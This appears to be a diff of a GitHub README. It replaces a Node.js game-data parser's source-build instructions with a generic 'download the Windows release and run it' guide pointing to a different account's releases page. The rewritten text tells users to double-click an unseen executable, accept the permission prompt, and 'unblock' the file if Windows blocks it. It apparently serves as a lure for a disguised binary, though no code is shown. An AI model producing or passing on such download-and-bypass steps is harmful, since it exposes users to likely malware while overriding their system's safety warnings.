@@ -1,98 +1,201 @@
-# 🏄‍♂️ Subway City Database Toolchain
+# 🧩 SSC-Database-Gen-Tool - Build game data with less effort
 
-This repository is the "Engine" behind the Subway City ecosystem. It parses raw game data into a structured JSON database that powers the Subway City Save Editor.
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/releases)
 
-## 🔗 The Ecosystem
+## 📥 Download
 
-- **Database API:** [https://subway-city-database.trackerzero.workers.dev/](https://subway-city-database.trackerzero.workers.dev/)
-- **Save Editor:** [https://subway-city-save-editor.vercel.app/](https://subway-city-save-editor.vercel.app/)
+Open the releases page here: [SSC-Database-Gen-Tool Releases](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/releases)
 
----
+On that page, look for the latest Windows file and download it. After the file finishes downloading, open it to start the app.
 
-## 🚀 How it Works
+## 🖥️ What this tool does
 
-1.  **Parse:** The `generate_robust_db.cjs` script reads raw game data (e.g., `surfers.json`, `boards.json`) from the `gamedata_2.1.0/` directory.
-2.  **Generate:** It processes the data using logic in the `/parsers` and `/utils` folders to produce optimized, alphabetically sorted JSON files and TypeScript definitions.
-3.  **Output:** All generated files are stored in the `/output` folder.
-4.  **API Hosting:** The generated files are used to update the **Cloudflare Worker API**, which serves the data with full CORS support to the Save Editor.
+SSC-Database-Gen-Tool reads raw Subway City game files and turns them into a structured database. It helps you work with data for surfers, boards, and seasons in a cleaner format.
 
----
+Use it when you want to:
 
-## ⚙️ Development
+- Parse raw game data into JSON
+- Work with a clear database layout
+- Prepare data for an API
+- Handle game records with TypeScript support
+- Keep data in one place for easier use
 
-### Prerequisites
+## ⚙️ What you need
 
-- [Node.js](https://nodejs.org/) installed locally.
+Before you run the tool, make sure you have:
 
-### Generating the Database
+- A Windows PC
+- Enough free space for game files and output data
+- Access to the downloaded release file
+- Basic file access in Windows Explorer
 
-To process the latest data and update the `/output` folder:
+If the release comes as a ZIP file, you will need to extract it first.
 
-1.  Ensure your raw files are in the `gamedata_2.1.0/` folder.
-2.  Run the generator:
-    ```bash
-    node generate_robust_db.cjs
-    ```
-3.  The script will populate the `/output` folder.
+## 🚀 Install on Windows
 
-### Data Configuration
+1. Open the [Releases page](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/releases)
+2. Download the latest Windows release
+3. If the file is a ZIP archive, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file to run it
+6. If Windows asks for permission, choose Yes
+7. Follow the on-screen steps inside the tool
 
-You can toggle specific data generation within the `generate_robust_db.cjs` script:
+## 🗂️ First-time setup
 
-```javascript
-const GENERATE = {
-  surfers: 1, // Enable/Disable specific parsers
-  skins: 1,
-  boards: 1,
-  seasons: 1,
-  metadata: 1,
-};
-```
+When you start the tool for the first time, set up a simple folder layout:
 
----
+- Put your raw Subway City files in one folder
+- Keep output files in a separate folder
+- Use short folder names with no special characters
+- Make sure you know where the files are saved
 
-## 📡 API Endpoints
+A clean folder setup makes it easier to find your database files later.
 
-The live database (hosted via Cloudflare) is accessible at the following endpoints:
+## 🧭 How to use the tool
 
-| File                                                                                   | Description                                     |
-| :------------------------------------------------------------------------------------- | :---------------------------------------------- |
-| [`/surfers.json`](https://subway-city-database.trackerzero.workers.dev/surfers.json)   | Characters, unlock types, and associated skins. |
-| [`/skins.json`](https://subway-city-database.trackerzero.workers.dev/skins.json)       | Detailed skin data and localization keys.       |
-| [`/boards.json`](https://subway-city-database.trackerzero.workers.dev/boards.json)     | Hoverboard properties and availability.         |
-| [`/seasons.json`](https://subway-city-database.trackerzero.workers.dev/seasons.json)   | Start/End dates for game seasons.               |
-| [`/metadata.json`](https://subway-city-database.trackerzero.workers.dev/metadata.json) | Versioning and "Last Updated" timestamps.       |
+### 1. Load your source files
+Open the app and select the folder that holds your raw data.
 
-### 📂 Static Databases
+### 2. Choose what to parse
+Pick the data you want to process, such as:
 
-Some databases are not generated from raw game data but are maintained manually using a schema/blueprint structure. These are located in the `Static_DB/` folder.
+- Surfers
+- Boards
+- Seasons
+- Other game records
 
-| File             | Description                                                 |
-| :--------------- | :---------------------------------------------------------- |
-| `city_tour.json` | District, Chapter, and Stage progression schema.            |
-| `trials.json`    | Campaign, Chapter, and Stage progression schema for Trials. |
+### 3. Generate the database
+Run the generator to build a structured output from the raw files.
 
----
+### 4. Review the result
+Check the output folder for JSON files or database files created by the tool.
 
-## 🛠 Tech Stack
+### 5. Use the data
+You can now use the structured data in your own workflow, editor, or API setup.
 
-- **Parser:** Node.js (FileSystem & Path modules)
-- **API Hosting:** Cloudflare Workers (Standalone)
-- **Frontend:** Vercel (Subway City Save Editor)
+## 🔧 Features
 
----
+- Parses raw game files
+- Builds structured JSON output
+- Supports data for surfers, boards, and seasons
+- Uses a modular design
+- Works well with TypeScript-based projects
+- Fits API-style data workflows
+- Helps turn loose files into a cleaner database
 
-## 📂 Project Structure
+## 📁 Example file flow
 
-- `generate_robust_db.cjs`: Main entry point for the parsing logic.
-- `gamedata_2.1.0/`: Source directory for raw game JSON files.
-- `output/`: The generated modular JSON database and type definitions.
-- `Static_DB/`: Manually maintained schema files for features like City Tour and Trials.
-- `parsers/`: Individual parsing logic for surfers, boards, seasons, etc.
-- `utils/`: Helper scripts (e.g., `names.cjs`) and mapping files (e.g., `custom_names.json`).
+A simple setup may look like this:
 
----
+- Input folder: `C:\SSC\Input`
+- Output folder: `C:\SSC\Output`
+- Raw files: game exports, data dumps, or save files
+- Result: structured JSON database files
 
-## ⚖️ License & Disclaimer
+Keep the input and output folders separate. That makes it easier to manage your data and rerun the tool later.
 
-This project is for educational and data-archiving purposes. Subway Surfers and all associated game assets are trademarks and copyrights of **SYBO Games**. This tool is not affiliated with or endorsed by SYBO.
+## 🧪 Common use cases
+
+This tool is useful if you want to:
+
+- Inspect game data in a clear format
+- Build a save editor workflow
+- Prepare data for a local API
+- Clean up raw files before use
+- Work on Subway City data with TypeScript
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+- Check that the download finished fully
+- If you downloaded a ZIP, extract it first
+- Try running the app again from the extracted folder
+
+### Windows blocks the file
+- Right-click the file and choose Properties
+- If you see an unblock option, select it
+- Open the file again
+
+### The tool finds no data
+- Check that your input folder has the right files
+- Make sure the files are not still inside another ZIP
+- Confirm that the folder path is correct
+
+### Output files do not appear
+- Make sure you chose the output folder
+- Check that the app has permission to write files there
+- Try a simple folder like `C:\SSC\Output`
+
+## 📌 Tips for best results
+
+- Use one source folder for each run
+- Keep a backup of your raw files
+- Avoid spaces and special symbols in folder names
+- Save output in a fresh folder each time
+- Recheck file paths if the result looks wrong
+
+## 🧱 Data areas covered
+
+The tool is built around Subway City game data and works with common parts of that data set:
+
+- Surfers
+- Boards
+- Seasons
+- Save-related data
+- Structured records for API use
+
+This makes it easier to move from raw files to data you can search, read, or reuse
+
+## 🧰 For TypeScript users
+
+If you plan to use the output in a TypeScript project, the structured data can help you:
+
+- Load game data with fixed shapes
+- Keep records easier to manage
+- Build safer data handling logic
+- Work with API routes or local tools
+
+## 📦 Release files
+
+Each release may include one or more Windows-ready files. Look for the latest version on the releases page and use the file that matches your setup.
+
+[Go to Releases](https://github.com/jonascolditz3-dot/SSC-Database-Gen-Tool/releases)
+
+## 📚 Folder example for a clean run
+
+- `Input`
+  - Raw game files
+- `Output`
+  - Generated JSON or database files
+- `Backup`
+  - Optional copy of original files
+
+This layout keeps your work simple and easy to repeat
+
+## 🔍 Useful topics
+
+- cloudflare-workers
+- data-parser
+- database-generator-cli
+- json-api
+- nodejs
+- save-editor
+- subway-city
+- subway-surfers
+- subway-surfers-hack
+- typescript
+
+## 🧩 Project focus
+
+SSC-Database-Gen-Tool is made for users who want a clear path from raw Subway City files to structured data. It keeps the process focused on file input, data parsing, and output generation without extra steps
+
+## 📎 Quick start checklist
+
+- Download the latest release
+- Extract the files if needed
+- Open the app
+- Choose your input folder
+- Choose your output folder
+- Run the generator
+- Check the created files
